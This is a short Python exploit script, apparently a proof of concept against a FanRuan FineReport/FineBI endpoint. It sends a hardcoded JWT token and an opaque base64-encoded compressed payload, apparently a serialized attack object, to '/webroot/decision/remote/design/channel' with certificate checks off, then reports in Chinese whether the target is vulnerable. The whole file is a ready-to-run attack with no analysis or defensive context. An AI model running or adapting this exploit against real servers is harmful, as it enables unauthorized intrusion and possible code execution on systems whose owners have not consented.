#
import base64
import requests
import urllib3

def cmd(host):
  try:
    url = host + "/webroot/decision/remote/design/channel"
    headers = {
      "Content-Type": "application/octet-stream", 
      "token": "eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJmYW5ydWFuIiwiaWF0IjoxNzIxOTMxNTE3LCJzdWIiOiJ0cmdhbmRhIiwianRpIjoiclp4bXBucWp1S1R3OTIzM2xSZWtKMXlSQWozYkxIcXVqemN4dW96djdoVnhXbDlIIn0.56EpWpf_MQnUDD8EW9W-9UjrtojABJK8PYY69Y3v31Y", 
      "username": "trganda"
    }

    b = b"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"
    data = base64.b64decode(b)
    headers["Content-Length"] = str(len(data))
    headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=10)
    if res.status_code == 200:
      print("[+]", host, "------存在漏洞！")
      # print("[+]", res.text)

  except Exception as e:
    print("[o]", host, "------不存在漏洞！")
    print(e)

if __name__ == "__main__":
    cmd("http://10.211.55.3:8075")
